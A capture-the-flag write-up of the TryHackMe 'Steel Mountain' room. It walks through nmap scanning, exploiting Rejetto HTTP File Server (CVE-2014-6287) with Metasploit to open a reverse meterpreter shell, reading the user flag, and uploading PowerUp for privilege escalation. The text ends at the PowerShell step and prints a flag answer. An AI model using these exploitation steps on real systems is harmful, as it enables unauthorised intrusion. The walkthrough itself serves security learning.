# Steel Moutain.md

Room [Steel Moutain](https://tryhackme.com/room/steelmountain) on TryHackMe

<h2></h2>

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "SteelMountain".

`mkdir SteelMountain`

- Change directory into SteelMountain.

`cd SteelMountain/`

<p align="center"> <img src="https://i.imgur.com/lV4jHcT.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.27.109]

Introduction: In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

Question: Who is the employee of the month?

`Bill Harper`

Navigate to the Temporary IP [10.10.27.109].

<p align="center"> <img src="https://i.imgur.com/9e0crsp.png" height="90%" width="90%" alt=""/>

Reverse image the picture with Google.

Right click the image > Select "Search image with Google".

<p align="center"> <img src="https://i.imgur.com/ChtOCix.png" height="90%" width="90%" alt=""/>

Found the name of the person in the photo.

<p align="center"> <img src="https://i.imgur.com/I0ZlrUc.png" height="90%" width="90%" alt=""/>

#

# Initial Access: Questions

Question 1: Scan the machine with nmap. What is the other port running a web server on?

Question 2: Take a look at the other web server. What file server is running?

Question 3: What is the CVE number to exploit this file server?

Quesion 4: Use Metasploit to get an initial shell. What is the user flag?

#

<h2>Question 1</h2>

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -p- -oN nmap_initial.txt 10.10.27.109`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-p-`: This flag specifies scanning all ports. The hyphen after -p indicates that Nmap should scan all 65535 ports. This can be time-consuming but thorough.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.27.109`.

<p align="center"> <img src="https://i.imgur.com/npFTfrB.png" height="90%" width="90%" alt=""/>

Question 1: Scan the machine with nmap. What is the other port running a web server on?

`8080`

#

# Question 2

Navigate to `10.10.27.109:8080` > Click on `HttpFileServer 2.3`.

<p align="center"> <img src="https://i.imgur.com/hFeQIln.png" height="90%" width="90%" alt=""/>

From the URL, we know that the server is "Rejetto". So it's "Rejetto HTTP File Server".

<p align="center"> <img src="https://i.imgur.com/8bO2Ojw.png" height="90%" width="90%" alt=""/>

Question 2: Take a look at the other web server. What file server is running?

`Rejetto HTTP File Server`

# 

# Question 3

Google: "Rejetto Http File Server 2.3 exploit" > Click on the first link for "Exploit-DB".

<p align="center"> <img src="https://i.imgur.com/Bmq2UtO.png" height="90%" width="90%" alt=""/>

Got the CVE number.

<p align="center"> <img src="https://i.imgur.com/PTUDGAQ.png" height="90%" width="90%" alt=""/>

Question 3: What is the CVE number to exploit this file server?

`2014-6287`

#

# Question 4

Use Metasploit to get an initial shell. We will search to see what exploit does rejetoo have on metasploit have.

On Terminal: `msfconsole` 
- To open Metasploit

On Terminal: `search rejetoo` 
- To search for exploit in Metasploit that contains "rejetoo".

<p align="center"> <img src="https://i.imgur.com/GjMLHR0.png" height="90%" width="90%" alt=""/>

We will use the only exploit found. 

On Terminal: `use 0`
- Use #0 from the matching modules.

<p align="center"> <img src="https://i.imgur.com/AZijwTL.png" height="90%" width="90%" alt=""/>

We will use "show options" to show what options is there for this exploit.

On Terminal: `show options`

<p align="center"> <img src="https://i.imgur.com/nTuNsuA.png" height="90%" width="90%" alt=""/>

We see that "RHOSTS" is required. We will change that to the Target IP Address. We will also change "RPORT" and "LHOST".

On Terminal: `set RHOSTS 10.10.27.109`

On Terminal: `set RPORT 8080`
- We are setting RPORT to 8080 because we are using 8080 instead of 80.

On Terminal: `set LPORT 10.6.106.187
- We changed the LPORT to our own machine IP, [Tryhackme's OpenVAS IP].

<p align="center"> <img src="https://i.imgur.com/DssxwRq.png" height="90%" width="90%" alt=""/>

Run the exploit and get into the meterpreter.

<p align="center"> <img src="https://i.imgur.com/RXMvMPo.png" height="90%" width="90%" alt=""/>

Use search to the user flag.

On Terminal: `search -f *.txt`
- `search`: This is the command or tool used for searching. The actual search tool may vary depending on your operating system or specific software installed.
- `-f`: This is an option or flag for the search command. The -f flag could potentially indicate that you want to search for files.
- `*.txt`: This is a file pattern or wildcard expression. In this case, it's searching for files with a ".txt" extension.

Found "user.txt" to be at `c:\Users\bill\Desktop`.

<p align="center"> <img src="https://i.imgur.com/v2PSVbb.png" height="90%" width="90%" alt=""/>

Use `cat` command to read the .txt file.

On Terminal: `cat c:/Users/bill/Desktop/user.txt`

<p align="center"> <img src="https://i.imgur.com/BGGzZWb.png" height="90%" width="90%" alt=""/>

Question 4: Use Metasploit to get an initial shell. What is the user flag?

`b04763b6fcf51fcd7c13abc7db4fd365`

#

# Privilege Escalation Questions

Question 1: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

Question 2: What is the root flag?

#

# Question 1

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root.

To investigate this computer, we'll use a PowerShell script called PowerUp. Its job is to check a Windows machine for any issues or irregularities. PowerUp is designed to be a handy tool for finding common ways in which Windows systems might not be set up correctly, making them vulnerable to security issues.

Download the script [Here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

Now we will use the upload command in Metasploit to upload the script into the target machine.

On Terminal: `upload PowerUp.ps1`
- Since we are already in Desktop/Tryhackme/Steel/Mountain.

<p align="center"> <img src="https://i.imgur.com/f0KDZJk.png" height="90%" width="90%" alt=""/>

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell.

On Terminal: `load powershell`
On Terminal: `powershell_shell`

<p align="center"> <img src="https://i.imgur.com/MHXJWwn.png" height="90%" width="90%" alt=""/>

